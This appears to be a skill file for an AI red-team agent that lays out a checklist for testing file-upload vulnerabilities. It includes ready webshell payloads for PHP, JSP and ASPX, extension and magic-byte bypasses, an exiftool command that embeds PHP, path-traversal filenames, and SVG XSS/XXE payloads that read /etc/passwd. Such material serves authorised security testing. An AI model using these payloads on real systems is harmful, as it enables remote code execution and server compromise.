---
name: file-upload-testing
description: File upload vulnerability testing — webshells, bypass, path traversal
origin: RedteamOpencode
---

# File Upload Vulnerability Testing

## When to Activate

- Application allows file upload (profile picture, document, attachment)
- File processing features (image resize, PDF conversion, import)
- Any endpoint accepting multipart/form-data

## Tools

- `run_tool curl` (multipart upload)
- Burp Suite Repeater (modify upload requests)
- ExifTool (embed payloads in metadata)
- Custom polyglot file generators

## Methodology

### 1. Understand Upload Mechanism

- [ ] Identify upload endpoint and parameters
- [ ] Check allowed file types (client-side vs server-side validation)
- [ ] Determine where files are stored (same domain, CDN, S3)
- [ ] Check if uploaded files are directly accessible via URL
- [ ] Check if filename is preserved or randomized
- [ ] Map the concrete workflow around the file: `submit → persist → retrieve/render/admin-review`
- [ ] Reuse existing upload evidence before branching into more payload variants

### Follow-Up Discipline (critical for unattended runs)

- Treat a successful upload acceptance or an existing upload finding as the start of a workflow, not the end.
- On follow-up passes, do **not** keep free-exploring extension/MIME permutations if the unresolved question is really where the uploaded content lands.
- Spend one bounded step on the highest-signal consumer path already evidenced by the app: retrieval URL, public/static asset path, gallery/list view, moderation queue, document viewer, export/download path, or downstream parser.
- If the consumer path still is not provable inside that bounded pass, return a concrete next step (exact workflow/artifact to confirm) instead of drifting or leaving the batch without outcomes.
- Keep the guidance generic: focus on storage, retrieval, rendering, parsing, and authorization around uploaded content — not target-specific paths.

### 2. Extension Bypass

- [ ] Double extension: `shell.php.jpg`, `shell.php.png`
- [ ] Null byte (legacy): `shell.php%00.jpg`, `shell.php\x00.jpg`
- [ ] Case variation: `shell.PhP`, `shell.pHP`, `shell.Php`
- [ ] Alternative extensions: `.php3`, `.php5`, `.phtml`, `.phar`
- [ ] JSP alternatives: `.jspx`, `.jsw`, `.jsv`
- [ ] ASP alternatives: `.aspx`, `.ascx`, `.ashx`, `.asa`, `.cer`
- [ ] Trailing characters: `shell.php.`, `shell.php...`, `shell.php `, `shell.php::$DATA`
- [ ] Upload `.htaccess` to add custom handler: `AddType application/x-httpd-php .xyz`
- [ ] Upload `.user.ini` with `auto_prepend_file=shell.jpg`

### 3. Content-Type Bypass

- [ ] Change `Content-Type` to `image/jpeg` or `image/png` while sending PHP
- [ ] Remove Content-Type header entirely
- [ ] Use valid MIME type for allowed format

### 4. Magic Bytes / Content Bypass

- [ ] Prepend valid image header: `GIF89a;<?php system($_GET['c']); ?>`
- [ ] Add JPEG magic bytes `FF D8 FF E0` before payload
- [ ] PNG header + PHP code in IDAT chunk
- [ ] Embed PHP in EXIF data: `exiftool -Comment='<?php system("id"); ?>' image.jpg`
- [ ] Polyglot file: valid image that is also valid PHP

### 5. Webshell Payloads

- [ ] PHP: `<?php system($_GET['c']); ?>`
- [ ] PHP short tag: `<?=`cat /etc/passwd`?>`
- [ ] JSP: `<% Runtime.getRuntime().exec(request.getParameter("c")); %>`
- [ ] ASPX: `<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd","/c " + Request["c"]); %>`
- [ ] Minimal: `<?=phpinfo();?>` to confirm execution

### 6. Path Traversal in Filename

- [ ] `../../../var/www/html/shell.php`
- [ ] `..%2f..%2f..%2fshell.php`
- [ ] `....//....//shell.php`
- [ ] Overwrite existing files: `../../config.php`
- [ ] Target web root or cron directories

### 7. Special File Attacks

- [ ] SVG with XSS: `<svg onload="alert(1)">` or `<script>` in SVG
- [ ] SVG with XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- [ ] HTML file upload → stored XSS
- [ ] PDF with JavaScript
- [ ] ZIP slip: archive with `../../` path entries
- [ ] XML file with XXE (DOCX, XLSX inner XML)

### 8. Size and Resource Limits

- [ ] Upload extremely large file — check size limits
- [ ] Upload many files rapidly — check rate limits
- [ ] Zip bomb / decompression bomb
- [ ] Image with huge dimensions (pixel flood)

## What to Record

- Upload endpoint and filename parameter
- Bypass technique used (extension, content-type, magic bytes)
- Uploaded file URL and whether it executes
- Webshell payload and confirmed RCE
- Path traversal success and file overwritten
- Severity: Critical (RCE via webshell) or High (XSS, file overwrite)
- Remediation: allowlist extensions, validate content, rename files, store outside webroot
